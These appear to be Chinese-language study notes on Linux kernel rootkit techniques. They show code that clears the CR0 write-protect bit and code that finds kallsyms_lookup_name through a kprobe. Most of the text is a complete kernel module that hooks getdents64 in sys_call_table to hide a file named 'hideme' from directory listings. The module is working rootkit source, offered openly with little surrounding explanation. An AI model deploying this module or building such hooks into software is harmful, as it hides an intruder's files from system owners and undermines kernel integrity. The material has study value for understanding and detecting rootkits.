# 读写绕过

```c
unsigned long __force_order;
inline void mywrite_cr0(unsigned long cr0) {
  asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}
void enable_write_protection(void) {
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  mywrite_cr0(cr0);
}
void disable_write_protection(void) {
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  mywrite_cr0(cr0);
}
```

# Linux内核中的cmpxchg函数

```c
#include <asm/cmpxchg.h>

cmpxchg(void *ptr, unsigned long old, unsigned long new);
```

函数完成的功能是：将old和ptr指向的内容比较，如果相等，则将new写入到ptr中，返回old，如果不相等，则返回ptr指向的内容。

# kallsyms\_lookup\_name函数地址获取
这个只能获取函数的地址
```c
#include <linux/kprobes.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long lookup_name(const char *name)
{
	struct kprobe kp = {
		.symbol_name = name
	};
	unsigned long retval;

	if (register_kprobe(&kp) < 0) return 0;
	retval = (unsigned long) kp.addr;
	unregister_kprobe(&kp);
	return retval;
}
#else
static unsigned long lookup_name(const char *name)
{
	return kallsyms_lookup_name(name);
}
#endif
```

这个函数与变量的地址都能获得
```c
/// kallsyms_lookup_name
#include <linux/kprobes.h>

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;
static void init_ksymbol(void){
    
    register_kprobe(&kp);
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
}

```

# 文件隐藏

hook sys_table  getdents function

```c
#include <linux/init.h>     /* module_init, module_exit */
#include <linux/module.h>   /* MODULE_LICENSE, MODULE_DESCRIPTION, MODULE_AUTHOR, MODULE_VERSION */
#include <linux/kernel.h>   /* printk */
#include <linux/slab.h>     /* kmalloc, kfree */
#include <linux/kallsyms.h> /* kallsyms_lookup_name */
#include <linux/dirent.h>   /* struct linux_dirent64 */
#include <linux/syscalls.h> /* __NR_getdents64 */
#include <linux/uaccess.h>  /* copy_from_user, copy_to_user */
#include <linux/string.h>   /* strcmp */
#include <linux/kprobes.h>

/* Macros */
#define FILE_TO_HIDE "hideme"
#define MAX_DIRENT_NAME_LEN 256

/* Module information */

/* Type definitions */
typedef asmlinkage void (*sys_call_ptr_t)(void);
typedef asmlinkage int (*getdents64_t)(unsigned int, struct linux_dirent64 __user *, unsigned int);
typedef asmlinkage int (*getdents64_regs_t)(const struct pt_regs *regs);

/* Global variables */
extern unsigned long __force_order;
static asmlinkage getdents64_t orig_getdents64;

struct filtered_dirent
{
    char *buffer;
    unsigned int size;
};

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;
static void init_ksymbol(void)
{

    register_kprobe(&kp);
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
}

static inline void write_forced_cr0(unsigned long value)
{
    asm volatile("mov %0,%%cr0"
                 : "+r"(value), "+m"(__force_order));
}

static inline void zero_wp(void)
{
    write_forced_cr0(read_cr0() & ~X86_CR0_WP);
}

static inline void one_wp(void)
{
    write_forced_cr0(read_cr0() | X86_CR0_WP);
}

static struct filtered_dirent filter_file_from_getdents(char __user *buffer, unsigned int bytes, const char *filter) // the bytes is the size of the buffer
{
    char *kbuffer = (char *)kmalloc(bytes, GFP_KERNEL);
    char *filtered_buffer = (char *)kmalloc(bytes, GFP_KERNEL);
    const struct linux_dirent64 *dp = NULL;
    unsigned int pos = 0;
    struct filtered_dirent fid = {
        .buffer = filtered_buffer,
        .size = 0};

    if (!kbuffer)
    {
        pr_err("Idan's module failed to allocate kbuffer");
        return fid;
    }
    if (!filtered_buffer)
    {
        kfree(kbuffer);
        pr_err("Idan's module failed to allocate filtered_buffer");
        return fid;
    }

    fid.buffer = filtered_buffer;
    if (copy_from_user(kbuffer, buffer, bytes) != 0)
    {
        kfree(kbuffer);
        pr_err("Idan's module failed to copy from user");
        return fid;
    }

    for (pos = 0; pos < bytes;)
    {
        dp = (struct linux_dirent64 *)(kbuffer + pos);
        pos += dp->d_reclen;
        if (dp->d_reclen == 0)
        {
            kfree(kbuffer);
            kfree(filtered_buffer);
            pr_err("Idan's module found taht d_reclen is 0");
            fid.buffer = NULL;
            return fid;
        }
        if (strcmp(dp->d_name, filter) != 0)
        {
            memmove((filtered_buffer + fid.size), (char *)dp, dp->d_reclen);

            fid.size += dp->d_reclen;
        }
    }

    /* freeing memory */
    kfree(kbuffer);

    return fid;
}

static asmlinkage int modified_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 *dirent = (struct linux_dirent64 *)regs->si;
    struct filtered_dirent fid;
    int bytes = ((getdents64_regs_t)orig_getdents64)(regs); // getdents64 checks if the user space pointer is alright so we don't have to do so

    if (bytes <= 0)
        return bytes; // error or empty

    fid = filter_file_from_getdents((char *)dirent, bytes, FILE_TO_HIDE);
    if (fid.buffer)
    {
        if (fid.size != 0 && copy_to_user(dirent, fid.buffer, fid.size) != 0)
        {
            kfree(fid.buffer);
            pr_err("Idan's module failed to copy to user");
            return -EFAULT;
        }
        kfree(fid.buffer);
    }
    else
    {
        return -EFAULT;
    }

    return fid.size;
}

static sys_call_ptr_t *get_sys_call_table(void)
{
    const char *sys_call_table_str = "sys_call_table"; // get the address of the sys_call_table which is basically like an array of all the addresses to the syscalls
    sys_call_ptr_t *sys_call_table = NULL;
    sys_call_table = (sys_call_ptr_t *)my_kallsyms_lookup_name(sys_call_table_str);
    if (!sys_call_table ||
        (void *)sys_call_table_str == (void *)sys_call_table)
        return NULL;
    return sys_call_table;
}

static int __init lkm_example_init(void)
{
    sys_call_ptr_t *sys_call_table;
    unsigned char EXIT_CODE = 0;

    init_ksymbol();
    pr_info("Idan's kernel started!");
    sys_call_table = get_sys_call_table();
    if (!sys_call_table)
    {
        pr_err("Idan's kernel module didn't find the sys call table");
        EXIT_CODE = 1;
        goto cleanup;
    }

    orig_getdents64 = (getdents64_t)sys_call_table[__NR_getdents64];
    zero_wp();
    sys_call_table[__NR_getdents64] = (sys_call_ptr_t)modified_getdents64;
    one_wp();
    pr_info("Idan's kernel successfully overridden the getdents64 function!!");

    goto cleanup;

cleanup:
    if (EXIT_CODE > 0)
        pr_err("Idan's kernel module failed to load with error code %d", EXIT_CODE);
    else
        pr_info("Idan's kernel module successfully loaded!");
    return EXIT_CODE;
}

static void __exit lkm_example_exit(void)
{
    sys_call_ptr_t *sys_call_table;

    sys_call_table = get_sys_call_table();
    if (!sys_call_table)
    {
        printk("Idan's kernel module didn't unloaded successfully because it couldn't find the sys_call_table");
        return;
    }

    zero_wp();
    sys_call_table[__NR_getdents64] = (sys_call_ptr_t)orig_getdents64;
    one_wp();

    pr_info("Idan's kernel module successfully unloaded!");
}

module_init(lkm_example_init);
module_exit(lkm_example_exit);
MODULE_LICENSE("GPL");
```

# 资料

<https://xcellerator.github.io/posts/linux_rootkits_07/>
